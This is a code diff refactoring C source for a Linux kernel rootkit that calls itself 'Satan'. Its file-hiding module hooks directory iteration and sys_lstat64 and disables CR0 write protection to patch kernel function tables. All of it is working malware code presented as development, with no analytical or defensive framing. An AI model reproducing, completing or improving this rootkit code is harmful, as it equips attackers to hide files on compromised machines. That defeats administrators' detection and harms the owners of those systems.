@@ -9,42 +9,60 @@
 #include "syscall.h"
 #include "util.h"
 
+
+/* Buffers for basename and filename, placed in .bss for performance reason */
 #define BASENAME_BUF_SIZE 128
 #define FILENAME_BUF_SIZE 128
 static char basename_buf[BASENAME_BUF_SIZE] = {0};
 static char filename_buf[BASENAME_BUF_SIZE] = {0};
-static char *basename = NULL;
 
 
+
+struct hidden_file;  // forward declaration
+static int satan_file_hook_iterate_shared(struct hidden_file *f);
+static int satan_file_unhook_iterate_shared(const struct hidden_file *f);
+
+
+
+/* Hidden file information and related functions */
 struct hidden_file {
-        char *fullpath;
-        char *basename;  // i.e., dirname
+        char *fullpath;  // fullpath = basename + '/' + filename
+        char *basename;
         char *filename;
         struct list_head list;
 };
 static LIST_HEAD(hidden_files_list);
 
+static struct hidden_file *hidden_files_list_add(const char *path);
+static int hidden_files_list_del(const char *path);
+static struct hidden_file *hidden_files_list_get(const char *path);
+
+
+
+/* original iterate_shared() is stored in this struct. */
+typedef int (*iterate_shared_t)(struct file *, struct dir_context *);
 
 struct dir_iterate_shared {
         char *basename;
-        int (*real_iterate_shared)(struct file *, struct dir_context *);
+        iterate_shared_t real_iterate_shared;  // address of original iterate_shared()
         struct list_head list;
 };
 static LIST_HEAD(real_iterate_shared_list);
 
-
-static int ret = 0;
-static struct file *filp = NULL;
-static struct file_operations *f_op = NULL;
-
-static int (*real_iterate_shared)(struct file *, struct dir_context *);
-static filldir_t real_filldir;
+static iterate_shared_t real_iterate_shared_list_get(const char *basename);
+static void real_iterate_shared_list_add(const char *basename, void *iterate_shared);
+static void real_iterate_shared_list_clear(void);
 
 
+
+/* Satan rootkit's malicious hooks for hiding files. */
 static int satan_iterate_shared(struct file *filp, struct dir_context *ctx);
 static int satan_filldir(struct dir_context *ctx, const char *name, int namlen,
                          loff_t offset, u64 ino, unsigned d_type);
 
+
+
+/* sys_lstat64 is hooked in satan_file_init() */
 asmlinkage int (*real_lstat64)(const char __user *filename,
                                struct stat64 __user *statbuf);
 
@@ -71,8 +89,6 @@ asmlinkage long satan_lstat64(const char __user *filename,
 
 
 
-static int satan_file_hook_iterate_shared(struct hidden_file *f);
-static int satan_file_unhook_iterate_shared(const struct hidden_file *f);
 
 static struct hidden_file *hidden_files_list_add(const char *path)
 {
@@ -80,7 +96,6 @@ static struct hidden_file *hidden_files_list_add(const char *path)
 
         memset(basename_buf, 0, BASENAME_BUF_SIZE);
         memset(filename_buf, 0, FILENAME_BUF_SIZE);
-
         satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
         satan_filename(path, filename_buf, FILENAME_BUF_SIZE);
 
@@ -105,7 +120,6 @@ static int hidden_files_list_del(const char *path)
 
         memset(basename_buf, 0, BASENAME_BUF_SIZE);
         memset(filename_buf, 0, FILENAME_BUF_SIZE);
-
         satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
         satan_filename(path, filename_buf, FILENAME_BUF_SIZE);
 
@@ -133,7 +147,6 @@ static struct hidden_file *hidden_files_list_get(const char *path)
 
         memset(basename_buf, 0, BASENAME_BUF_SIZE);
         memset(filename_buf, 0, FILENAME_BUF_SIZE);
-
         satan_basename(path, basename_buf, BASENAME_BUF_SIZE);
         satan_filename(path, filename_buf, FILENAME_BUF_SIZE);
 
@@ -149,7 +162,7 @@ static struct hidden_file *hidden_files_list_get(const char *path)
 }
 
 
-static unsigned long *real_iterate_shared_list_get(const char *basename)
+static iterate_shared_t real_iterate_shared_list_get(const char *basename)
 {
         struct dir_iterate_shared *dir_is = NULL;
         struct list_head *p = NULL;
@@ -158,7 +171,7 @@ static unsigned long *real_iterate_shared_list_get(const char *basename)
                 dir_is = list_entry(p, struct dir_iterate_shared, list);
 
                 if (!strncmp(basename, dir_is->basename, strlen(dir_is->basename))) {
-                        return (unsigned long *) (dir_is->real_iterate_shared);
+                        return dir_is->real_iterate_shared;
                 }
         }
 
@@ -168,11 +181,6 @@ static unsigned long *real_iterate_shared_list_get(const char *basename)
 static void real_iterate_shared_list_add(const char *basename, void *iterate_shared)
 {
         struct dir_iterate_shared *dir_is = NULL;
-
-        // Don't re-add if it already exists.
-        if (real_iterate_shared_list_get(basename))
-                return;
-
 
         dir_is = (struct dir_iterate_shared *) kmalloc(sizeof(struct dir_iterate_shared), GFP_KERNEL);
         dir_is->basename = kzalloc(strlen(basename) + 1, GFP_KERNEL);
@@ -263,8 +271,10 @@ int satan_file_unhide(const char *path)
  */
 static int satan_file_hook_iterate_shared(struct hidden_file *f)
 { 
-        ret = 0;
-        filp = filp_open(f->basename, O_RDONLY, 0);
+        int ret = 0;
+        struct file *filp = filp_open(f->basename, O_RDONLY, 0);
+        struct file_operations *f_op = NULL;
+
 
         if (IS_ERR(filp)) {
                 pr_alert("satan: failed to open %s\n", f->basename);
@@ -304,8 +314,11 @@ out:
  */
 static int satan_file_unhook_iterate_shared(const struct hidden_file *f)
 {
-        ret = 0;
-        filp = filp_open(f->basename, O_RDONLY, 0);
+        int ret = 0;
+        struct file *filp = filp_open(f->basename, O_RDONLY, 0);
+        struct file_operations *f_op = NULL;
+        iterate_shared_t real_iterate_shared = real_iterate_shared_list_get(f->basename);
+
 
         if (IS_ERR(filp)) {
                 pr_alert("satan: failed to open %s:\n", f->basename);
@@ -313,11 +326,8 @@ static int satan_file_unhook_iterate_shared(const struct hidden_file *f)
                 goto out;
         }
 
+
         f_op = (struct file_operations *) filp->f_op;
-
-        // Get the real iterate_shared() of this directory from `real_iterate_shared_list`.
-        real_iterate_shared = (void *) real_iterate_shared_list_get(f->basename);
-
 
         CR0_WP_DISABLE {
                 pr_info("satan: restoring iterate_shared from %p to %p\n",
@@ -333,22 +343,28 @@ out:
 }
 
 
+
+/* These variables are used in both satan_iterate_shared() and satan_filldir() */
+static char *basename = NULL;
+static filldir_t real_filldir = NULL;  
+
 static int satan_iterate_shared(struct file *filp, struct dir_context *ctx)
 {
+        int ret = 0;
+        iterate_shared_t real_iterate_shared = NULL;
+
         // Get the absolute path of `filp` via `d_path()`.
         // I've tried `dentry_path_raw()` but it always returns a wrong path :(
         memset(basename_buf, 0, BASENAME_BUF_SIZE);
         basename = d_path(&filp->f_path, basename_buf, BASENAME_BUF_SIZE);
-        pr_info("satan: basename %s\n", basename);
 
-        // Get the real iterate_shared() of this directory from `real_iterate_shared_list`.
-        real_iterate_shared = (void *) real_iterate_shared_list_get(basename);
-
-
-        real_filldir = ctx->actor;
+        // Get the real iterate_shared() of this directory from `real_iterate_shared_list`
+        // which will be invoked very soon.
+        real_iterate_shared = real_iterate_shared_list_get(basename);
 
         // ->iterate_shared() will call ctx->actor, i.e., filldir()
         // Here we'll replace the original filldir() with our version of filldir().
+        real_filldir = ctx->actor;
         *(filldir_t *)&ctx->actor = satan_filldir;
         ret = real_iterate_shared(filp, ctx);
         *(filldir_t *)&ctx->actor = real_filldir;
